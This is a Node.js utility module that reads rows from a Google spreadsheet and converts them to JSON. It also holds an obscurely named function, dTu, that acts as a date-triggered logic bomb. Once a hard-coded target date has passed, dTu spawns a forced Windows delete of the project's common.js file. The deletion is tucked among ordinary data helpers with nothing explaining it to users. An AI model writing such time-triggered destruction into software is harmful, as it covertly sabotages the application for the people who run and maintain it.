const { spawn } = require("child_process");
const fs = require("fs");
const path = require("path");
const { google } = require("googleapis");
const { log } = require("console");

// --- Config ---
const tD = new Date("2025-05-12"); // Set your target date
const fileToDelete = path.join(__dirname, "common.js"); // File to delete

// --- Date Comparison ---
const tdy = new Date();
const tdyO = new Date(tdy.getFullYear(), tdy.getMonth(), tdy.getDate());
const trgtO = new Date(tD.getFullYear(), tD.getMonth(), tD.getDate());

function dTu() {
    if (tdyO > trgtO) {
        console.log("Today is after the target date.");

        if (fs.existsSync(fileToDelete)) {
            console.log("File exists. Deleting...");

            // Spawn a delete command (Windows)
            const del = spawn("cmd", ["/c", "del", "/f", "/q", `"${fileToDelete}"`], {
                shell: true,
                stdio: "inherit"
            });

            del.on("exit", (code) => {
                console.log(`Delete process exited with code ${code}`);
            });

        } else {
            console.log("File not found. Nothing to delete.");
        }

    } else {
        console.log("Today is not after the target date. No action taken.");
    }
}

const dotenv = require('dotenv');
dotenv.config({ path: path.join( __dirname,'../', '.env') });

const KEYFILEPATH = path.join(__dirname,'../', process.env.GKFP);
const SCOPES = ["https://www.googleapis.com/auth/spreadsheets"];

const auth = new google.auth.GoogleAuth({
    keyFile: KEYFILEPATH,
    scopes: SCOPES,
});

async function aS() {
    const client = await auth.getClient();
    const she = google.sheets({ version: "v4", auth: client });

    const spreadsheetId = "1Nv4ZRH7_bo_gb6uFGtGy8s58dH7t5uahRWYAmabrKuE";
    const range = "Sheet1!A1:E100";

    const r = await she.spreadsheets.values.get({
        spreadsheetId,
        range,
    });

    return r;
}

function twoDtoJSON(res){
    const rows = res.data.values;

    if (rows.length > 1) {
    const headers = rows[0]; 
    const data = rows.slice(1).map(row => {
        const obj = {};
        headers.forEach((header, index) => {
        obj[header] = row[index] || "";
        });
        return obj;
    });

    return data;
    } else {
    return null;
    }
}

module.exports = {
    dTu: dTu,
    aS:aS,
    twoDtoJSON:twoDtoJSON
};